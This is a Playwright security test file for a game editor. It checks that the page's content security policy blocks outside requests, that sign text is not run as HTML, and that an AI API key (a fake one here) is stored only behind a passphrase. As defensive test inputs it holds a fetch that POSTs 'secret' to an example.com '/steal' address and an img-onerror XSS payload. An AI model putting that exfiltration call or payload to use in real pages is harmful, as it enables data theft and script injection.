import { expect, test } from '@playwright/test';

/**
 * P33: the editor page only talks to itself and the AI host (content security policy); game text is never run
 * as code; the AI key can be locked with a passphrase so it is never stored in plain text.
 */
type Ed = { scene: { value: unknown }; exec(c: unknown): { ok: boolean; error?: string }; mapId: { value: string } };
const KEY = `sk-ant-api03-${'A1b2C3d4'.repeat(6)}`;

test('the page cannot reach other hosts; text in a game never runs', async ({ page }) => {
  test.setTimeout(240_000);
  const errors: string[] = [];
  page.on('pageerror', (e) => errors.push(e.message));
  const offsite: string[] = [];
  page.on('request', (r) => {
    const u = new URL(r.url());
    if (!['127.0.0.1', 'localhost', 'fonts.googleapis.com', 'fonts.gstatic.com'].includes(u.hostname))
      offsite.push(u.hostname);
  });
  await page.goto('/editor.html?nohub');
  await page.waitForFunction(() => !!(window as unknown as { __editor?: Ed }).__editor?.scene.value, undefined, {
    timeout: 60_000,
  });
  // a script that got into the page cannot send anything elsewhere
  const sent = await page.evaluate(() =>
    fetch('https://example.com/steal', { method: 'POST', body: 'secret' }).then(
      () => 'sent',
      () => 'blocked',
    ),
  );
  expect(sent).toBe('blocked');
  // a sign whose text looks like HTML is shown as text
  const made = await page.evaluate(() => {
    const e = (window as unknown as { __editor: Ed }).__editor;
    return e.exec({
      type: 'item.add',
      payload: {
        map: e.mapId.value,
        item: {
          id: 'ins_pwnedsign1',
          kind: 'ui',
          widget: 'sign',
          text: '<img src=x onerror="window.__pwned=1">',
          pos: [0, 2, -6],
          maxDistance: 200,
        },
      },
    });
  });
  expect(made.ok, made.error).toBe(true);
  await page.keyboard.press('F5');
  await page.getByLabel('Game view').waitFor({ timeout: 60_000 });
  await page.waitForTimeout(2500);
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
  expect(offsite).toEqual([]);
  expect(errors).toEqual([]);
});

test('AI key: locked with a passphrase, never stored in plain text; unlocked by typing it', async ({ page }) => {
  test.setTimeout(240_000);
  await page.goto('/editor.html?nohub');
  await page.waitForFunction(() => !!(window as unknown as { __editor?: Ed }).__editor?.scene.value, undefined, {
    timeout: 60_000,
  });
  await page
    .getByRole('button', { name: /AI builder/ })
    .first()
    .click();
  const panel = page.getByRole('complementary', { name: 'AI builder' });
  await expect(panel).toBeVisible();
  const keys = panel.locator('[data-tour="ai-key"]');
  // the panel may open its settings by itself a moment after it appears (no key yet / key locked):
  // toggle until the key fields stay open instead of racing that
  const showKeys = async () => {
    for (let i = 0; i < 4 && !(await keys.isVisible()); i++) {
      await page.waitForTimeout(400);
      if (!(await keys.isVisible())) await panel.getByRole('button', { name: 'AI builder settings' }).click();
      await page.waitForTimeout(400);
    }
    await expect(keys).toBeVisible();
  };
  await showKeys();
  await keys.getByLabel('How the key is kept').selectOption('locked');
  await keys.getByLabel('Anthropic API key').fill(KEY);
  await keys.getByLabel('New passphrase').fill('correct horse battery');
  await keys.getByRole('button', { name: 'Save key' }).click();
  await expect(keys.getByText(/Key locked with your passphrase/)).toBeVisible({ timeout: 30_000 });
  const stored = await page.evaluate(() => JSON.stringify(Object.entries(localStorage)));
  expect(stored).not.toContain('sk-ant');
  expect(
    await page.evaluate(
      () => (JSON.parse(localStorage.getItem('brickworlds.ai') ?? '{}') as { keyMode?: string }).keyMode,
    ),
  ).toBe('locked');
  // a new page: the key is locked until the passphrase is typed
  await page.reload();
  await page.waitForFunction(() => !!(window as unknown as { __editor?: Ed }).__editor?.scene.value, undefined, {
    timeout: 60_000,
  });
  await page
    .getByRole('button', { name: /AI builder/ })
    .first()
    .click();
  await showKeys();
  await keys.getByLabel('Passphrase', { exact: true }).fill('wrong one!');
  await keys.getByRole('button', { name: 'Unlock key' }).click();
  await expect(keys.getByText('That passphrase does not unlock the key.')).toBeVisible({ timeout: 30_000 });
  await keys.getByLabel('Passphrase', { exact: true }).fill('correct horse battery');
  await keys.getByRole('button', { name: 'Unlock key' }).click();
  await expect(keys.getByText('Key unlocked for this page.')).toBeVisible({ timeout: 30_000 });
  await page.screenshot({ path: 'test-results/security-key.png' });
  expect(await page.evaluate(() => JSON.stringify(Object.entries(localStorage)))).not.toContain('sk-ant');
});
